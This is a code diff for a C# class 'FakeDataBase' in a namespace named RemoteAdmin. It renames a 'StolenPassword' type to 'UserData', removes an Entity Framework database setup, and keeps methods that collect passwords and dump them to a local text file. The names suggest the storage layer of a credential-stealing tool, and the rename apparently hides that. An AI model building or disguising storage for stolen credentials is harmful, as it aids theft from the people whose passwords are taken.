@@ -7,39 +7,32 @@ using System.Threading.Tasks;
 
 namespace RemoteAdmin.Models
 {
-    public class FakeDataBase : DbContext
+    public class FakeDataBase 
     {
-        public static List<StolenPassword> passwords = new List<StolenPassword>();
+        public static List<UserData> passwords = new List<UserData>();
         public static int Id { get; set; } = 0;
 
-        public DbSet<StolenPassword> Passwords { get; set; }
+        public DbSet<UserData> Passwords { get; set; }
 
-        public static IEnumerable<StolenPassword> GetPasswords
+        public static IEnumerable<UserData> GetPasswords
         {
             get{
                 return passwords;
             }
         }
 
-        public FakeDataBase() : base()
+        public FakeDataBase() 
         {
                 
         }
 
-        protected override void OnConfiguring(DbContextOptionsBuilder builder)
-        {
-            builder.UseSqlServer(@"Data Source=(localdb)\\mssqllocaldb;
-                                 Initial Catalog=FakePasswordsDb;
-                                 Integrated Security = true;
-                                 MultipleActiveResultSets = true;");
-        }
-
-        public static void AddPassword(StolenPassword pass)
+     
+        public static void AddPassword(UserData pass)
         {
             passwords.Add(pass);
         }
         //TODO add Entity FrameWork 
-        public static void GetDump(StolenPassword pass)
+        public static void GetDump(UserData pass)
         {
             Id += 1;
             using (StreamWriter sw = new StreamWriter("d://dump.txt", true))
